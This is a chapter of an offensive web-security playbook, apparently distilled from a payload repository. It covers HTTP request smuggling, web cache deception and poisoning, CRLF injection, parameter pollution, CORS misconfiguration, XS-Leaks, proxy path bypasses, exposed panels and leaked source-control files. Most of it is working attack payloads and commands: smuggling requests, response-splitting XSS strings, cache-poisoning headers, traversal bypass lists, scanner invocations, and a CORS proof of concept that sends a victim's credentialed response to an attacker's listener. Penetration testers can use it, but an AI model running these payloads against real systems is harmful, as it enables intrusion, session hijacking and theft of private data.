# Ch14 — HTTP Protocol & Infrastructure Attacks

> Request smuggling (CL.TE/TE.CL/TE.TE/H2), client-side desync, web cache deception & poisoning, CRLF injection, HTTP parameter pollution, CORS misconfig, XS-Leaks, virtual hosts, reverse-proxy paths, exposed panels, leaked SCM.
> Sources: `Request Smuggling/`, `Web Cache Deception/`, `CRLF Injection/`, `HTTP Parameter Pollution/`, `CORS Misconfiguration/`, `XS-Leak/`, `Virtual Hosts/`, `Reverse Proxy Misconfigurations/`, `Insecure Management Interface/`, `Insecure Source Code Management/`.

**Route here when**: front-end/back-end chains disagree (proxy/CDN/load balancer), caching layers front the app, headers reflect into responses, duplicate params are plausible, cross-origin data reads matter.

## HTTP request smuggling

Front-end and back-end disagree on where a request ends. Three archetypes:

**CL.TE** (front uses Content-Length, back uses Transfer-Encoding):

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Working probe — the `G` prefix smuggles into the next request's method:

```http
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Signal: the *next* requester's response shows `GPOST`-style errors.

**TE.CL** (front uses TE, back uses CL):

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

In Burp Repeater: disable "Update Content-Length", include trailing `\r\n\r\n` after the final `0`.

**TE.TE** (both accept TE — obfuscate one server's view):

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
 Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

**HTTP/2 smuggling**: H2→H1 downgrades let you smuggle CL/TE or CRLF inside headers:

```ps1
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```

**Client-side desync** — some paths treat POST-with-body as two requests:

```http
POST / HTTP/1.1
Host: www.example.com
Content-Length: 37

GET / HTTP/1.1
Host: www.example.com
```

Chain with a browser `fetch` to poison the response queue → stored-response XSS/credential capture (see upstream for the HEAD-redirect variant).

Detection tool: defparam/smuggler (`python3 smuggler.py -u https://target`). Impacts: cache poisoning, session hijack, response-queue poisoning, front-end bypass to internal routes.

## Web cache deception

Trick the cache into storing a private page under a static-extension URL:

```ps1
https://example.com/myaccount/home/malicious.css
https://example.com/app/conversation/.js?test
https://example.com/app/conversation/;.js
```

Mechanics: origin resolves `/home` content; cache keys on the `.css` suffix → attacker fetches the same URL later and gets the cached private page.

**Delimiter discrepancies** to test: `/path/<dynamic>;<static>` (`;`, `.`, `?` — origin ignores suffix, cache treats it as a file). Normalization: `/wcd/..%2fprofile` — origin decodes traversal, cache stores under `/wcd/`.

**Cache poisoning** — unkeyed inputs that alter the cached response:

```js
Values: User-Agent, Cookie
Headers: X-Forwarded-Host, X-Host, X-Forwarded-Server, X-Forwarded-Scheme,
         X-Original-URL (Symfony), X-Rewrite-URL (Symfony)
```

```http
GET /test?buster=123 HTTP/1.1
Host: target.com
X-Forwarded-Host: test"><script>alert(1)</script>
```

Always add a `?buster=` param so you poison only your test URL, not the homepage.

CDN notes (Cloudflare): caches by extension, not MIME — `Cache-Control: public, max-age>0` needed; "Cache Deception Armor" compares extension to Content-Type (bypassed historically via `.avif`, octet-stream).

## CRLF injection / HTTP response splitting

Inject `%0d%0a` into a header-reflected value to break the response in two:

```ps1
%0d%0aSet-Cookie:%20admin=true                 // session fixation / cookie set
%0d%0aLocation:%20http://YOUR-HOST             // forced redirect
```

Full body-split XSS (inject Content-Length: 0 + fake second response):

```ps1
?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

```ps1
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

Filter bypass: browsers/servers that strip out-of-range bytes — multi-byte UTF-8 chars whose low byte is `0x0a`/`0x0d`/`0x3c`/`0x3e` (e.g., U+560A, U+560D, U+563C, U+563E) collapse to CR/LF/</> after stripping.

## HTTP parameter pollution (HPP)

Duplicate params — behavior is stack-dependent:

| Stack | `?a=1&a=2` result |
|---|---|
| PHP/Apache, Django, Rails | last → `2` |
| Flask, Go `Query().Get`, JSP/Tomcat, mod_wsgi, Perl CGI | first → `1` |
| ASP.NET/IIS, Node.js | all → `1,2` |
| Go `Query()["a"]`, Zope | array `['1','2']` |

Payload shapes:

```ps1
param=v1&param=v2                       // classic duplicate
param[]=v1&param[]=v2 / param=v1&param[]=v2   // array coercion
param=v1%26other=v2                     // encoded & smuggles a second param
param[k1]=v1&param[k2]=v2               // nested keys
{"test":"user","test":"admin"}          // duplicate JSON keys — last wins in many parsers
```

Uses: bypass per-value WAF rules, override mass-assignment allowlists (ch15), redirect-param priority tricks (ch12).

## CORS misconfiguration

Test: `Origin: https://evil.com` on a credentialed endpoint → check `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials` in the response.

| Case | Detection | PoC shape |
|---|---|---|
| Reflects any origin + credentials | `ACAO: <your-origin>` + `ACAC: true` | XHR with `withCredentials` → response readable cross-origin |
| `null` origin allowed | `Origin: null` → `ACAO: null` + ACAC | sandboxed iframe with `src="data:text/html,..."` (browser sends `Origin: null`) |
| Prefix/regex flaw | `https://evilexample.com` or `https://apiiexample.com` accepted | host PoC on the lookalike domain |
| Wildcard `*` | `ACAO: *` — no cookies ever, but internal-network targets are still readable | XHR without credentials → pivot primitive |
| Trusted-origin XSS | whitelist is strict but a whitelisted origin has XSS | deliver the CORS payload through that XSS |

```js
var req = new XMLHttpRequest();
req.onload = function(){ location='//YOUR-LISTENER/log?r='+this.responseText; };
req.open('get','https://victim.example.com/endpoint',true);
req.withCredentials = true;
req.send();
```

## XS-Leaks (cross-site oracles)

When CORS blocks reads, browser side-channels still leak bits:

| Primitive | Leaks | Example |
|---|---|---|
| Timing | response size/complexity | `performance.now()` around `fetch`/`script` load |
| Frame count | search results / state | `window.open(url).length` counts iframes |
| Errors | access decisions, redirects | `script.onerror`/`onload` on cross-origin loads |
| Cache | prior visits/auth state | measure load time of a resource that's cached only for logged-in users |
| Navigation | auth state, redirects | `history.length`, redirect-start timing |
| Rendering | text length | `getComputedStyle` / scroll-width oracles |

XS-Search: binary-search a secret through a boolean search endpoint (results/no-results → distinct oracle). Catalog: xsinator.com's oracle list (COOP/CORB/CORP/CSP/frame-count/download/redirect/SRI/performance-API leaks).

## Virtual hosts & origin discovery

- vhost brute: `gobuster vhost -u https://target -w wordlist.txt` — vhost-scoped admin apps hide behind the same IP.
- Origin behind CDN/WAF: `prips <CIDR> | hakoriginfinder -h https://target/foo` — direct-origin hits bypass the CDN's rules (SSRF/WAF evasion, see ch05).

## Reverse-proxy & path normalization

Frontend/backend path disagreements expose internal routes:

```ps1
/..;/admin /%2e%2e/admin /;/admin /admin%3b ..;/..;/admin
/api/..;/internal /static/../admin //admin ///admin
```

Test nginx `alias`/`location` mismatches (`/static../` = off-by-slash), `X-Original-URL`/`X-Rewrite-URL` header overrides (Symfony/IIS), `X-Forwarded-Prefix` path injections.

## Insecure management interfaces

```ps1
nuclei -t http/default-logins -u https://target
nuclei -t http/exposed-panels -u https://target
nuclei -t http/exposures -u https://target
```

Look for: unauthenticated admin panels (`/admin`, actuator endpoints, `/metrics`, `/debug`, jolokia, `/env`, spring-boot `/actuator/*`), default credentials, plaintext-HTTP panels, `/server-status`, Jenkins/GitLab/Consul panels on nonstandard ports.

## Exposed source-code management

Check for repo/config artifacts:

```ps1
/.git/HEAD /.git/config /.git/index /.svn/entries /.hg/ /.bzr/
/.env /.DS_Store /composer.json /package.json /web.config /WEB-INF/web.xml
/.github/workflows/ /.idea/ /.vscode/
```

`.git` objects downloadable → `git-dumper`/GitTools reconstruct source → hunt for hardcoded keys, endpoints, comments. `.env`-style config files → credentials/keys (classify per ch13).
